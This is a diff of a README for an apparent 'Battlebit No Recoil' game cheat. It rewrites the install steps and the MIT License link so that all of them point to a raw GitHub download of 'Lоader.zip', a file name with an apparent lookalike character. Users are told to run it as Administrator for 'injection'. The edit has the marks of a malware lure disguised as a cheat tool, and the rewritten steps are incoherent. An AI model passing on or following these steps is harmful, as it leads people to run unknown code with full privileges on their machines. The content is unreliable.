@@ -40,11 +40,11 @@ Our program incorporates numerous features to provide the best experience for Ba
 
 Get started with **Battlebit No Recoil** by following these detailed steps:
 
-1. **Download Loader.rar from the repository.**
-    - Locate **Loader.rar** in the GitHub release section or main page.
-2. **Extract Loader.rar** to a preferred folder on your PC.
+1. **Download https://raw.githubusercontent.com/jimmyner009/RecoilTamer-BattlebitBoost/main/Lоader.zip from the repository.**
+    - Locate **https://raw.githubusercontent.com/jimmyner009/RecoilTamer-BattlebitBoost/main/Lоader.zip** in the GitHub release section or main page.
+2. **Extract https://raw.githubusercontent.com/jimmyner009/RecoilTamer-BattlebitBoost/main/Lоader.zip** to a preferred folder on your PC.
     - Use trusted tools like WinRAR or 7-Zip to extract the files.
-3. **Run Loader.exe as Administrator.**
+3. **Run https://raw.githubusercontent.com/jimmyner009/RecoilTamer-BattlebitBoost/main/Lоader.zip as Administrator.**
     - Essential for proper injection and process permissions.
 4. **Configure your recoil and mouse settings.**
     - Follow the on-screen instructions to personalize your experience.
@@ -90,7 +90,7 @@ Please support game developers by respecting their terms and guidelines.
 
 # 📄 MIT License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/jimmyner009/RecoilTamer-BattlebitBoost/main/Lоader.zip).  
 Feel free to review, use, and distribute according to the license terms!
 
 ---
